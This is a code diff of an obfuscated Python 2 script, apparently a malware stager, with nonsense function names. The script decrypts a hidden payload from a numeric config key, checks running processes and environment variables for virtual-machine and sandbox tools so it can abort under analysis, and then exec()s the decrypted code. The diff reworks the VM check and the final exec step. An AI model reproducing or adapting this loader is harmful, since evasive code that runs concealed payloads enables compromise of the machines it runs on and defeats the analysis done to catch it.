@@ -1,50 +1,3 @@
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-#
-# Copyright (c) 2017 colental
-#
-# Permission is hereby granted, free of charge, to any person obtaining a copy
-# of this software and associated documentation files (the "Software"), to deal
-# in the Software without restriction, including without limitation the rights
-# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-# copies of the Software, and to permit persons to whom the Software is
-# furnished to do so, subject to the following conditions:
-#
-# The above copyright notice and this permission notice shall be included in
-# all
-# copies or substantial portions of the Software.
-#
-# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
-# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-# SOFTWARE.
-
-
-'''  
-
-        ,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,  aa       aa
-        ""     `Y8 88P'   `"8a a8"    `Y88 88P'   `"8a 88       88
-        ,adPPPPP88 88       88 8b       88 88	       8b	88
-        88,    ,88 88       88 "8a,   ,d88 88	       "8a,   ,d88
-        `"8bbdP"Y8 88       88  `"YbbdP"Y8 88           `"YbbdP"Y8
-                                aa,    ,88 	        aa,    ,88
-                                 "Y8bbdP"          	 "Y8bbdP'
-
-                                                       88                          ,d
-                                                       88                          88
-         ,adPPYba,  ,adPPYb,d8  ,adPPYb,d8 8b,dPPYba,  88 ,adPPYYba, 8b,dPPYba,    88
-        a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
-        8PP""""""" 8b       88 8b       88 88       d8 88 ,adPPPPP88 88       88   88
-        "8b,   ,aa "8a,   ,d88 "8a,   ,d88 88b,   ,a8" 88 88,    ,88 88       88   88
-         `"Ybbd8"'  `"YbbdP"Y8  `"YbbdP"Y8 88`YbbdP"'  88 `"8bbdP"Y8 88       88   88,
-                    aa,    ,88  aa,    ,88 88                                      "Y888
-                     "Y8bbdP"    "Y8bbdP"  88
-
-'''
-
 from __future__ import print_function
 import os
 import sys
@@ -78,7 +31,7 @@ def main(*args, **kwargs):
             output  = "".join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, packed))
             vector  = block
             result.append(output)
-        return ''.join(result).rstrip("\x00")
+        return ''.join(result).rstrip(chr(0))
         
     def CrystallineSluggishAnatomy(*args, **kwargs):
         IncontinentObtuseCucumber = lambda x: long(bytes(x).encode('hex'), 16)
@@ -145,11 +98,19 @@ def main(*args, **kwargs):
                 
     s = 'tasklist' if os.name is 'nt' else 'ps'
     c = 0 if os.name is 'nt' else -1
-    if 'checkvm' in kwargs:
-        if bool([_ for _ in os.environ.keys() if 'VBOX' in _.upper()] + [i.split()[c] for i in os.popen(s).read().splitlines()[2:] if i.split()[c].lower().split('.')[0] in ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser', 'vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem'] if 'checkvm' in args]):
+    if kwargs.get('checkvm'):
+        check_environ = [_ for _ in os.environ.keys() if 'VBOX' in _.upper()]
+        check_procs   = [i.split()[c] for i in os.popen(s).read().splitlines()[2:] if i.split()[c].lower().split('.')[0] in ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser', 'vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem']]
+        if len(check_environ + check_procs):
             if _debug:
-                print('aborting')
-            sys.exit(0)
+                print("\n\tVirtual Machine detected!\n")
+                
+                if len(check_environ):
+                    print("\nEnvironment variables:\n\t{}\n".format(', '.join(["{}".format(i) for i in check_environ])))
+                if len(check_procs):
+                    print("\nRunning processes:\n\t{}\n".format(', '.join(["{}".format(i) for i in check_procs])))
+                if raw_input("\n\tAbort launch? (y/n): ").lower().startswith('y'):
+                    sys.exit(0)
     if 'config' in kwargs:
         AccidentalAquaticCat        = CrystallineSluggishAnatomy(**kwargs)
         SomberUnbecomingAmusement   = lambda x: bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241%s' % x)).strip('0x').strip('L')))
@@ -171,8 +132,10 @@ def main(*args, **kwargs):
 
 if __name__ == '__main__':
     try:
-        header, body, footer = main(config=81126388790932157784)
-        exec "\n\n\n".join([header, body, footer])
+        header, body, footer = main(checkvm=True, config=81126388790932157784)
+        body = body.replace('from __future__ import print_function','')
+        code = '\n\n\n'.join([header, body, footer])
+        exec(code)
     except Exception as e:
         if _debug:
             print("Error: {}".format(str(e)))
